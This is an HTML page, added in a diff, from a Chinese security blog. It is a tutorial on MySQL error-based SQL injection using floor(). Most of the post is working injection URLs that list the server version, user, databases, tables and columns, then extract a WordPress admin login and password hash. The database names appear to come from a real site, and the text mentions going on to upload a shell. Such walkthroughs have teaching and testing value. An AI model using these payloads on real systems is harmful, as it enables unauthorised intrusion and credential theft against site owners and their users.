@@ -1,0 +1,367 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
+    
+        <meta name="description" content="专注于web和内网攻防研究,安全开发,安全运维,架构安全,热衷于高质量实用干货分享,提供全方位网络安全培训,更多请扫码关注自己博客下方的微信公众号,同时也期待更多志同道合的兄弟能一起并肩作战">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="klion">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="sql注入入门 之 mysql 显错注入 [ floor()显错 ]"/>
+    
+
+    <!--Open Graph Description-->
+    
+        <meta property="og:description" content="专注于web和内网攻防研究,安全开发,安全运维,架构安全,热衷于高质量实用干货分享,提供全方位网络安全培训,更多请扫码关注自己博客下方的微信公众号,同时也期待更多志同道合的兄弟能一起并肩作战" />
+    
+
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="klion&#39;s blog"/>
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="article" />
+    
+
+    <!--Page Cover-->
+    
+
+    <meta name="twitter:card" content="summary" />
+    
+
+    <!-- Title -->
+    
+    <title>sql注入入门 之 mysql 显错注入 [ floor()显错 ] - klion&#39;s blog</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/style.css">
+
+    <!-- Google Analytics -->
+    
+
+
+</head>
+
+
+<body>
+
+<div class="bg-gradient"></div>
+<div class="bg-pattern"></div>
+
+<!-- Menu -->
+<!--Menu Links and Overlay-->
+<div class="menu-bg">
+    <div class="menu-container">
+        <ul>
+            
+            <li class="menu-item">
+                <a href="/">
+                    home
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/archives">
+                    archives
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/about">
+                    about me
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/contact">
+                    blogs
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+<!--Hamburger Icon-->
+<nav>
+    <a href="#menu"></a>
+</nav>
+
+<div class="container">
+
+    <!-- Main Content -->
+    <div class="row">
+    <div class="col-sm-12">
+
+        <!--Title and Logo-->
+        <header>
+    <div class="logo">
+        <a href="/"><i class="logo-icon fa " aria-hidden="true"></i></a>
+        
+    </div>
+</header>
+
+        <section class="main">
+            
+<div class="post">
+
+    <div class="post-header">
+        <h1 class="title">
+            <a href="/2016/05/13/mysql-error-injection/">
+                sql注入入门 之 mysql 显错注入 [ floor()显错 ]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-05-13</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/all-sql-injection/">all sql injection</a>
+                </span>
+            
+        </div>
+    </div>
+
+    <div class="content">
+
+        <!-- Gallery -->
+        
+
+        <!-- Post Content -->
+        <p><br><br>1,实例显错型 mysql 注入点,如下:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/mysql_error1.png" alt="&#39;&#39;"><br></p>
+<p>2,尝试单引号后,目标如期报错,很好,我们要的正是这个报错信息,因为后面的查询全都要靠它,另外,从报错信息来看,我们知道目标是linux的机器,网站的物理路径也顺便送给了我们,如果root的注入点,我们岂不是,嘿嘿……<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">'</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/mysql_error2.png" alt="&#39;&#39;"><br></p>
+<p>3,同样,虽然这里打眼一看可能又会以为是个数字型注入,但其实后端依然是把它当做字符串来接收的,所以,就需要我们把前后的单引号都闭合掉<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">'and '</span>s<span class="string">'='</span>s</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mysql_error2_1.png" alt="&#39;&#39;"><br></p>
+<p>4,成功闭合后,就可以继续正常查询各种数据,还是习惯性的先搜集下目标数据库的相关信息<br>获取当前数据库版本<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (select concat(0x7e,version(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mysql_error3.png" alt="&#39;&#39;"><br></p>
+<p>获取当前数据库用户权限<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (select concat(0x7e,user(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mysql_error4.png" alt="&#39;&#39;"><br></p>
+<p>查看当前数据库名,可知当前数据库名为 ‘jamesbaird_pcba’<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mysql_error5.png" alt="&#39;&#39;"><br></p>
+<p>查看目标的机器名,可能有时候我们希望根据目标的机器名来大致判断当前机器是干啥的,以此来确定其价值的高低……<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (select concat(0x7e,@@hostname,0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mysql_error6.png" alt="&#39;&#39;"><br></p>
+<p>查看目标mysql的安装路径,创建自定义函数时可能会用到<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (select concat(0x7e,@@basedir,0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mysql_error7.png" alt="&#39;&#39;"><br></p>
+<p>5,搜集完相关信息以后,我们开始查询真正的数据,首先,列出所有的数据库名(依然是你有权限看的’所有’),同样是利用limit<br>获取第一个数据库名<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mysql_error8.png" alt="&#39;&#39;"><br></p>
+<p>获取第二个数据库名<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 1,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mysql_error9.png" alt="&#39;&#39;"><br></p>
+<p>获取第三个数据库名,从前面我们已经知道,这个是我们当前所在的库<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 2,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mysql_error10.png" alt="&#39;&#39;"><br></p>
+<p>获取第四个数据库名<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 3,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mysql_error11.png" alt="&#39;&#39;"><br></p>
+<p>6,有了所有的数据库名以后,我们就可以开始查表名了,首先,查出当前库中的所有表名,当然,我们的最终目的还是为了找到目标网站的管理表,不一定非要把所有的表名都查出来,找到管理表,只要拿到账号密码即可</p>
+<p>从当前库中获取第一张表名<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mysql_error12.png" alt="&#39;&#39;"><br></p>
+<p>接着依次获取第二张表名,第三张表名,……其实,中间还查出来很多表,但并不是我想要的,所以中间的过程我就都省略了,不过,最终也还是没能找到我们想要的那张管理表,没办法,只能跨库查了,当然,跨库肯定是有前提的,你只能跨到你有权限跨进的库中,废话不多讲,我们继续查<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 1,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mysql_error13.png" alt="&#39;&#39;"><br></p>
+<p>直到当我查到’jamesbaird<em>current’这个库时,一眼就发现了’wp</em>‘ 前缀,有经验的一眼就看出来了,这是个wordpress程序的数据库,既是开源程序,库表结构自然就非常清晰了(一般情况下很少人会改它原来的库表结构,因为那样可能意味着要大篇幅重构代码,如果不是做深度二次开发,最多可能只会在原有的库表基础上加表加功能),下面的十六进制数据表示的是’jamesbaird_current’库名,如下:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=0x6a616d657362616972645f63757272656e74 LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mysql_error14.png" alt="&#39;&#39;"><br></p>
+<p>7,按说,我们现在就可以直接去查出管理员的账号密码,因为wordpress默认的管理表名和该表中的字段名我们早已了如指掌,为了文章完整性,这里还是一步步的来吧<br>获取第二个字段名,用户名字段,下面的十六进制数据表示的是’wp_users’的表名<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=0x77705f7573657273 LIMIT 1,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mysql_error15.png" alt="&#39;&#39;"><br></p>
+<p>获取第三个字段名,密码字段<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=0x77705f7573657273 LIMIT 2,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mysql_error16.png" alt="&#39;&#39;"><br></p>
+<p>8,现在,直接从wp_users表中获取管理员的账号和密码hash即可,至此,一次基本的mysql显错注入就算完成了,虽然我们现在查到的账号密码可能并不是这个网站的后台管理账号密码,但起码我们知道它肯定有一个wordpress程序存在,找到那个wordpress所在的地址,然后登进去,传shell也是一样的,可那并不是今天的重点,这里我也不啰嗦了<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x23,user_login,0x3a,user_pass,0x23) FROM jamesbaird_current.wp_users limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and  '</span>s<span class="string">'='</span>s</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mysql_error17.png" alt="&#39;&#39;"><br></p>
+<p>9,最终,我们得到的管理员的账号密码如下<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">admin:</span><span class="number">5</span>ce14b22a4406974b33dfcaa****** (md5的hash,相必这个wordpress版本必然很低)</div></pre></td></tr></table></figure></p>
+<p><br></p>
+<p>一点小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;这里也只是简单演示了在显错注入中最常用的一种,基于floor()函数的,关于另外两个函数的利用和这个方式都基本一致,语句稍微变下即可,这里就不再重复啰嗦了,另外,今天的重点只是想让大家明白怎么通过显错进行注入,注入语句可能一眼看上去比较难懂,但从里往外一句句拆出来执行就知道什么意思了,其实不难,关键是自己一定要有耐心<br><br></p>
+
+    </div>
+
+    
+
+    
+        <div class="post-tags">
+            <i class="fa fa-tags" aria-hidden="true"></i>
+            <a href="/tags/sqlinjection/">#sqlinjection</a>
+        </div>
+    
+
+    <!-- Comments -->
+    
+
+</div>
+        </section>
+
+    </div>
+</div>
+
+</div>
+
+<!-- Footer -->
+<div class="push"></div>
+
+<footer class="footer-content">
+
+<center>
+<span>有偿提供各类全面靠谱的安全优化加固方案,入侵取证及全方位企业内部及个人网络安全培训...<font color="red"> &nbsp;&nbsp;klion@protonmail.com</span><br>
+<br>
+<br>
+<font size="5" color="#00FF7F" style="margin-left=-10px;">关注公众号</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="5" color="#00FF7F">随意捐助 [ 微信 ]</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="5" color="#00FF7F">加入小密圈</font>
+<br>
+<br>
+<img src="/img/small.jpg"  alt="klionsec" />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="/img/klion.png" with="262" height="254" alt="klionsec" />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="/img/xiaomi.png" with="260" height="257">
+<br><br>
+<br><font color="yellow" size="4">
+如果觉得内容还不错,也希望您能高抬贵手帮忙转发一下,让更多需要的人都能看到,本人不胜感激
+</font><br><br>
+<font color="#00FF7F" size="4">
+相信您的支持和鼓励换来的将会是更高质量的不懈创作,本人将一直秉承博客初衷,坚持高质量原创实用干货分享</font>
+<br><br><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<span id="busuanzi_container_site_pv">博客累计访问量 <span id="busuanzi_value_site_pv"></span> </span>
+<span id="busuanzi_container_site_uv">
+累计访客数 <span id="busuanzi_value_site_uv"></span> 
+</span>
+<span id="showDays"></span>
+<script>
+var birthDay = new Date("12/28/2014");
+var now = new Date();
+var duration = now.getTime() - birthDay.getTime(); 
+var total= Math.floor(duration / (1000 * 60 * 60 * 24));
+document.getElementById("showDays").innerHTML = " 其实,博客已默默独自坚挺了 "+total+" 天";
+</script>
+<br>
+<br>
+多年实战渗透经验积累[大中小型网络] + 娴熟的底层及脚本编写能力 + 熟练的协议分析能力 + 多个大中型安全架构实际设计部署经验 + 良好的逆向分析能力[一定的0day挖掘能力] = 合格安全架构师
+<br>
+<br>
+<br>
+<font size=6 color="white">唯一不变的,就是一直在变</font>
+    <div class="container">
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <ul class="list-inline footer-social-icons">
+                    
+                    <li class="list-inline-item">
+                        <a href="https://github.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-github"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://twitter.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-twitter"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.facebook.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-facebook"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="http://www.jianshu.com/u/2a4d8b1f03e0">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-instagram"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.zhihu.com/people/klionsec/activities">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-dribbble"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="mailto:klion@protonmail.com">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-envelope-o"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <div class="footer-copyright">
+                    <strong><font size=4 color=#00FF7F> Blog by klionsec </font></strong>
+                </div>
+            </div>
+        </div>
+    </div>
+<!--
+<audio autoplay="autoplay" width="300" height="200">
+	<source src="/img/Bandari - Childhood Memory.mp3" type="audio/mpeg" />
+</audio>
+-->
+</footer>
+
+
+
+<!-- After footer scripts -->
+
+<!-- jQuery -->
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+
+<!-- Tween Max -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
+
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
+
+<!-- Custom JavaScript -->
+<script src="/js/main.js"></script>
+
+<!-- Disqus Comments -->
+
+
+
+</body>
+
+</html>
